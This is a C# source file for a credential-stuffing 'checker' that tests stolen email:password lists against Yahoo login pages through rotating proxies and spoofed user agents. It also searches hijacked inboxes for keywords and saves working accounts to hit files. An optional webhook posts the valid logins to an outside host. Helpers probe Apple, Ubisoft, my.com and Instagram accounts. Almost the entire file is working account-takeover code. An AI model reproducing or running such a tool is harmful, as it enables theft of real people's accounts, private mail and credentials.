using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Galaxy.Mainm;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class YahooInbox1kek
	{
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!YahooInbox1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (YahooInbox1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = YahooInbox1check.RandomProxies();
								string RANUA = Http.RandomUserAgent();
								var USERR = WebUtility.UrlEncode("" + email);
								var PASSS = WebUtility.UrlEncode("" + password);
								httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
								httpRequest.AddHeader("Cache-Control", "max-age=0");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Referer", "https://www.google.com/");
								httpRequest.AddHeader("Sec-Fetch-Dest", "document");
								httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
								httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
								httpRequest.AddHeader("Sec-Fetch-User", "?1");
								httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
								httpRequest.AddHeader("User-Agent", "" + RANUA + "");

								var res0 = httpRequest.Get("https://login.yahoo.com/");
								string text0 = res0.ToString();

								var acrumb = Functions.LR(text0, "\"acrumb\" value=\"", "\"").FirstOrDefault();
								var sessionIndex = Functions.LR(text0, "sessionIndex\" value=\"", "\"").FirstOrDefault();
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
								httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Origin", "https://login.yahoo.com");
								httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
								httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
								httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
								httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
								httpRequest.AddHeader("User-Agent", "" + RANUA + "");
								httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");

								var res1 = httpRequest.Post("https://login.yahoo.com/", "acrumb=" + acrumb + "&sessionIndex=" + sessionIndex + "&username=" + USERR + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8");
								string text1 = res1.ToString();

								var URL = Functions.LR(text1, "{\"location\":\"", "\"}").FirstOrDefault();
								if (!text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME"))
								{
									httpRequest.AllowAutoRedirect = false;
									httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
									httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
									httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
									httpRequest.AddHeader("Cache-Control", "max-age=0");
									httpRequest.AddHeader("Connection", "keep-alive");
									httpRequest.AddHeader("Origin", "https://login.yahoo.com");
									httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
									httpRequest.AddHeader("Sec-Fetch-Dest", "document");
									httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
									httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
									httpRequest.AddHeader("Sec-Fetch-User", "?1");
									httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
									httpRequest.AddHeader("User-Agent", "" + RANUA + "");

									var res2 = httpRequest.Post("https://login.yahoo.com" + URL + "", "crumb=czI9ivjtMSr&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=" + USERR + "&passwordContext=normal&password=" + PASSS + "&verifyPassword=Next", "application/x-www-form-urlencoded");
									string text2 = res2.ToString();

									if (text2.Contains("https://guce.yahoo.com/consent?gcrumb="))
									{
									RETRY:
										httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
										httpRequest.AddHeader("Pragma", "no-cache");
										httpRequest.AddHeader("Accept", "*/*");
										string pre = httpRequest.Get("https://mail.yahoo.com/").ToString();
										var WSSID = Functions.LR(pre, "mailWssid\":\"", "\",\"calendarWssid").FirstOrDefault();
										foreach (string line in File.ReadAllLines("Data//Keywords.txt"))
										{
											string get = httpRequest.Get($"https://data.mail.yahoo.com/psearch/v3/srp?expand=MAIN&query={line}&appid=YMailNorrin&wssid={WSSID}").ToString();
											if (get.Contains("EC-4003"))
											{
												string acc1 = email + ":" + password;
												YahooInbox1check.Combo.Enqueue(acc1);
												Interlocked.Increment(ref YahooInbox1check.retry);
												goto RETRY;
											}
											else
											{
												int a = Regex.Matches(get, line).Count;
												if (a == 0)
												{
													lock (Program.WriteLock)
													{
														Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
														Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
														Interlocked.Increment(ref YahooInbox1check.custom);
														if (Program.config.showlocked == "True" && Program.config.ui == 2)
														{
															Colorful.Console.WriteLine("[»] Custom " + account, Color.Pink);
														}
														if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Custom.txt", account);
													}
													break;
												}
												else
												{
													lock (Program.WriteLock)
													{
														Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
														Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
														Interlocked.Increment(ref stats.currentCpm); Interlocked.Increment(ref stats.currentCpm);

														Interlocked.Increment(ref YahooInbox1check.Hits); Interlocked.Increment(ref stats.hits);
														string cap = account + " | Keyword: " + line + " | Results: " + a;
														if (Program.config.showgood == "True" && Program.config.ui == 2)
														{
															Colorful.Console.WriteLine("[»] Valid " + cap, Color.Green);
														}
														if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path1 + $"\\{line}.txt", cap);
														if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
													}
													break;
												}
											}
										}
									}
									else if (text2.Contains("/account/challenge/password?") || text2.Contains("Get Account Key code") || text2.Contains("recognize"))
									{
										lock (Program.WriteLock)
										{
											Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
											Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
											Interlocked.Increment(ref YahooInbox1check.Bad); Interlocked.Increment(ref stats.bad);
											if (Program.config.showbad == "True" && Program.config.ui == 2)
											{
												Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
											}
											Save(Path + "\\Invalid.txt", account);
										}
										break;
									}
									else if (text2.Contains("account/challenge/fail?src") || text2.Contains("Not Found") || text2.Contains("account/challenge/phone-obfuscation") || text2.Contains(">Open any Yahoo app<"))
									{
										lock (Program.WriteLock)
										{
											Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
											Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
											Interlocked.Increment(ref YahooInbox1check.custom);
											if (Program.config.showlocked == "True" && Program.config.ui == 2)
											{
												Colorful.Console.WriteLine("[»] Custom " + account, Color.Pink);
											}
											if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Custom.txt", account);
										}
										break;
									}
									else
									{
										string acc1 = email + ":" + password;
										YahooInbox1check.Combo.Enqueue(acc1);
										Interlocked.Increment(ref YahooInbox1check.retry);
										break;
									}
								}
								else if (text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME") || text1.Contains("account/challenge/push?src=noSrc") || text1.Contains("Sorry, we don't recognize this email"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref YahooInbox1check.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else if (text1.Contains("recaptcha"))
								{
									string acc1 = email + ":" + password;
									YahooInbox1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref YahooInbox1check.retry);
									break;
								}
								else if (text1.Contains("account/challenge/phone-obfuscation") || text1.Contains(">Open any Yahoo app<"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref YahooInbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref YahooInbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref YahooInbox1check.custom);
										if (Program.config.showlocked == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Custom " + account, Color.Pink);
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Custom.txt", account);
									}
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								YahooInbox1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref YahooInbox1check.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = YahooInbox1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref YahooInbox1check.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = YahooInbox1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref YahooInbox1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = YahooInbox1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = YahooInbox1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					YahooInbox1check.Combo.Enqueue(acc1);
					Interlocked.Increment(ref YahooInbox1check.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = YahooInbox1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref YahooInbox1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
